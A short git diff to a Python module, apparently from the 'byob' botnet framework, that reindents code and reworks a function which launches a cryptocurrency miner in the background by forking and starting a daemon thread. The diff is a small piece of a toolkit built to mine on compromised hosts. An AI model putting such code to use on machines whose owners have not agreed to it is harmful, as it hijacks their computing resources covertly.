@@ -14,14 +14,14 @@ import binascii
 import threading
 
 if sys.version_info[0] == 3:
-	import urllib.parse as urlparse # Python 3
+  import urllib.parse as urlparse # Python 3
 else:
-	from urllib2 import urlparse 	# Python 2
+  from urllib2 import urlparse  # Python 2
 
 try:
-    xrange			# Python 2
+    xrange      # Python 2
 except NameError:
-    xrange = range	# Python 3
+    xrange = range  # Python 3
 
 # byob utilities
 import util
@@ -866,19 +866,23 @@ def test_subscription():
   log('TEST: Correct answer %r' % valid, LEVEL_DEBUG)
 
 
-@util.threaded
 def run(url, username, password):
-	"""
-	Run the crytocurrency miner in the background
+  """
+  Run the crytocurrency miner in the background
 
-	`Required`
-	:param str url:			stratum mining server url
-	:param str username:	username for mining server
-	:param str password:	password for mining server
+  `Required`
+  :param str url:     stratum mining server url
+  :param str username:  username for mining server
+  :param str password:  password for mining server
 
-	"""
-	global ALGORITHM_SHA256D
-	if os.fork() or os.fork():
-	  sys.exit()
-	miner = Miner(url, username, password, ALGORITHM_SHA256D)
-	miner.serve_forever()
+  """
+  global ALGORITHM_SHA256D
+  pid = os.fork()
+  if pid:
+    miner = Miner(url, username, password, ALGORITHM_SHA256D)
+    t = threading.Thread(target=miner.serve_forever)
+    t.daemon = True
+    t.start()
+    return pid
+  else:
+    sys.exit(0)
